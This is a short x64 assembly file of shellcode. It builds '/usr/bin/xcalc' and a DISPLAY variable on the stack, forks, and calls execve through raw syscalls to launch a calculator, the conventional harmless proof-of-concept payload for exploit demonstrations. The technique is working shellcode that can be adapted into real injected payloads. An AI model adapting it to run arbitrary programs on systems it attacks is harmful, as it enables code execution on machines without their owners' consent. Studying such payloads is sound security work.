;
; execv shellcode for x64
;

bits 64

section .text
        global main

main:
push   rbx
mov    rax, '/usr/bin'
sub    rsp, 0x40
mov    qword [rsp+0x11], rax
mov    eax, 'lc'
lea    rbx, [rsp+0x11]
mov    word [rsp+0x1d], ax
mov    rax, 'DISPLAY='
mov    dword [rsp+0x19], '/xca'
mov    qword [rsp+0x4], rax
lea    rax, [rsp+0x4]
mov    byte [rsp+0x1f], 0x0
mov    dword [rsp+0xc], ':0.0'
mov    byte [rsp+0x10], 0x0
mov    qword [rsp+0x20], rax
mov    qword [rsp+0x28], 0x0
mov    qword [rsp+0x30], rbx
mov    qword [rsp+0x38], 0x0

fork:
mov    rax, 0x39
syscall

test   eax, eax
jne    return

execv:
lea    rdx, [rsp+0x20]
lea    rsi, [rsp+0x30]
mov    rdi, rbx

mov    rax, 0x3b
syscall

return:
add    rsp, 0x40
pop    rbx
ret